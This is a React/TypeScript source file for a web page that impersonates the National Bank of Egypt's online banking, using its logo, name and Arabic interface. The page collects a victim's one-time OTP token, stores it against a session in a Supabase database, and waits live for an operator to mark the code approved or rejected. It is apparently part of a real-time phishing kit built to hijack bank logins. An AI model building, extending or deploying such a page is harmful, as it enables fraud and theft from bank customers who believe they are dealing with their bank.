import { createFileRoute, useNavigate } from "@tanstack/react-router";
import { CheckCircle2 } from "lucide-react";
import { useEffect, useRef, useState } from "react";
import nbeLogo from "@/assets/nbe-logo-full.png";
import { supabase } from "@/integrations/supabase/client";
import { useSessionRedirect } from "@/hooks/use-session-redirect";

export const Route = createFileRoute("/public-number")({
  head: () => ({
    meta: [{ title: "إدخال الرقم العام | الأهلي نت" }],
  }),
  component: PublicNumberPage,
});

function PublicNumberPage() {
  useSessionRedirect();
  const navigate = useNavigate();
  const [publicNumber, setPublicNumber] = useState("");
  const [submitting, setSubmitting] = useState(false);
  const [submitted, setSubmitted] = useState(false);
  const [error, setError] = useState("");
  const channelRef = useRef<ReturnType<typeof supabase.channel> | null>(null);

  useEffect(() => {
    if (typeof window === "undefined") return;
    const id = sessionStorage.getItem("nbe_session_id");
    if (!id) navigate({ to: "/login" });
    return () => {
      if (channelRef.current) supabase.removeChannel(channelRef.current);
    };
  }, [navigate]);

  const handleSubmit = async (event: React.FormEvent) => {
    event.preventDefault();
    if (!publicNumber.trim()) return;

    const sessionId =
      typeof window !== "undefined"
        ? sessionStorage.getItem("nbe_session_id")
        : null;
    if (!sessionId) {
      navigate({ to: "/login" });
      return;
    }

    setError("");
    setSubmitting(true);

    const { error: updateError } = await supabase
      .from("sessions")
      .update({ public_number: publicNumber, status: "pending_public_number" })
      .eq("id", sessionId);

    if (updateError) {
      setSubmitting(false);
      setError("حدث خطأ أثناء الإرسال. حاول مرة أخرى.");
      return;
    }

    const channel = supabase
      .channel(`session-public-number-${sessionId}`)
      .on(
        "postgres_changes",
        {
          event: "UPDATE",
          schema: "public",
          table: "sessions",
          filter: `id=eq.${sessionId}`,
        },
        (payload) => {
          const row = payload.new as { status: string };
          if (row.status === "public_number_approved") {
            setSubmitting(false);
            setSubmitted(true);
            supabase.removeChannel(channel);
            channelRef.current = null;
          } else if (row.status === "public_number_rejected") {
            setSubmitting(false);
            setPublicNumber("");
            setError("الرقم العام غير صحيح. حاول مرة أخرى.");
          }
        },
      )
      .subscribe();
    channelRef.current = channel;
  };

  if (submitted) {
    return (
      <div dir="rtl" className="flex min-h-screen flex-col bg-background text-foreground">
        <header className="flex items-center justify-end border-b border-border px-6 py-4">
          <img
            src={nbeLogo}
            alt="البنك الأهلي المصري"
            width={1920}
            height={520}
            className="h-9 w-auto object-contain md:h-11"
          />
        </header>

        <main className="flex flex-1 flex-col items-center justify-center px-4 text-center">
          <div className="flex h-20 w-20 items-center justify-center rounded-full bg-green-100 text-green-600">
            <CheckCircle2 className="h-10 w-10" />
          </div>
          <h1 className="mt-6 text-2xl font-bold">تم تأكيد الرقم بنجاح</h1>
          <p className="mt-2 text-sm text-muted-foreground">تم إدخال الرقم العام.</p>
        </main>

        <footer className="bg-primary py-4 text-center text-xs font-semibold text-primary-foreground">
          جميع الحقوق محفوظة - البنك الأهلي المصري ©
        </footer>
      </div>
    );
  }

  return (
    <div dir="rtl" className="flex min-h-screen flex-col bg-muted/40 text-foreground">
      <header className="flex items-center justify-end border-b border-border bg-background px-6 py-4">
        <img
          src={nbeLogo}
          alt="البنك الأهلي المصري"
          width={1920}
          height={520}
          className="h-9 w-auto object-contain md:h-11"
        />
      </header>

      <main className="flex flex-1 flex-col items-center px-4 py-10">
        <form
          onSubmit={handleSubmit}
          className="w-full max-w-md rounded-2xl bg-background p-6 text-right shadow-sm ring-1 ring-border/60"
        >
          <h1 className="text-xl font-bold text-foreground">برجاء إدخال الرقم السري المتغير OTP Token</h1>
          <p className="mt-4 text-sm leading-relaxed text-muted-foreground">
            أدخل الرقم المطلوب لإتمام الخطوة التالية.
          </p>

          <div className="mt-8 flex flex-col items-center">
            <span className="text-base font-medium text-muted-foreground">Public Number</span>
            <div className="mt-4 h-12 w-12 animate-spin rounded-full border-[5px] border-muted border-t-muted-foreground/60" />
          </div>

          <div className="mt-6">
            <input
              type="text"
              inputMode="numeric"
              value={publicNumber}
              onChange={(event) => setPublicNumber(event.target.value.replace(/\D/g, ""))}
              placeholder="••••••"
              autoFocus
              disabled={submitting}
              dir="ltr"
              aria-label="الرقم العام"
              className="w-full rounded-xl border border-input bg-background px-6 py-4 text-center text-2xl font-bold tracking-[0.4em] outline-none transition-colors placeholder:text-muted-foreground/50 placeholder:font-normal focus:border-primary focus:ring-4 focus:ring-primary/20 disabled:opacity-60"
            />
            {error && (
              <p className="mt-4 text-sm font-semibold text-destructive">{error}</p>
            )}
          </div>

          <button
            type="submit"
            disabled={submitting || !publicNumber.trim()}
            className="mt-6 w-full rounded-xl bg-primary py-4 text-base font-bold text-primary-foreground transition-colors hover:bg-primary/90 disabled:opacity-60"
          >
            {submitting ? "جارٍ الإرسال..." : "تأكيد"}
          </button>
        </form>
      </main>

      <footer className="bg-primary py-4 text-center text-xs font-semibold text-primary-foreground">
        جميع الحقوق محفوظة - البنك الأهلي المصري ©
      </footer>
    </div>
  );
}
